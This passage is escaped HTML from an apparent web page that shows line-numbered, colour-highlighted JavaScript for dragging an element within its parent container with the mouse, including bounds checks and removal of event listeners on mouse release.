style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;var&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;op=obj.parentNode;&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;33&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;var&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;opX=parseInt(op.style.left);&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;34&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;var&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;opY=parseInt(op.style.top);&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;35&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;36&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;if&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;((e.clientX-x_)&amp;lt;0)&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;return&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;false&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;;&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;37&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;else&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;if&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;((e.clientX-x_+obj.offsetWidth+opX)&amp;gt;(opX+op.offsetWidth))&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;return&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;false&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;;&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;38&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;39&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;if&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;(e.clientY-y_&amp;lt;0)&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;return&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;false&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;;&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;40&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;else&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;if&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;((e.clientY-y_+obj.offsetHeight+opY)&amp;gt;(opY+op.offsetHeight))&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;return&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;false&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;;&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;41&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:green;&quot;&gt;//status=e.clientY-y_;&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;42&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;43&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;44&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;obj.style.left=e.clientX-x_+''px'';&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;45&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;obj.style.top=e.clientY-y_+''px'';&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;46&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;47&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;inFstop(e);&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;48&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:green;&quot;&gt;//&amp;nbsp;shawl.qiu&amp;nbsp;script&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;49&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;function&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;inFup(e){&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;50&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;var&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;evt;&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;51&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;if&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;(!e)e=window.event;&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;52&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;53&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;if&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;(document.removeEventListener){&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;54&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;document.removeEventListener(''mousemove'',&amp;nbsp;inFmove,&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;true&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;);&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;55&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;document.removeEventListener(''mouseup'',&amp;nbsp;inFup,&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;true&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;);&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;56&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;else&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;if&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;(document.detachEvent){&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;57&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;document.detachEvent(''onmousemove'',&amp;nbsp;inFmove);&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;58&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;document.detachEvent(''onmouseup'',&amp;nbsp;inFup);&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;59&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;60&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;61&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;inFstop(e);&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;62&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;63&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; 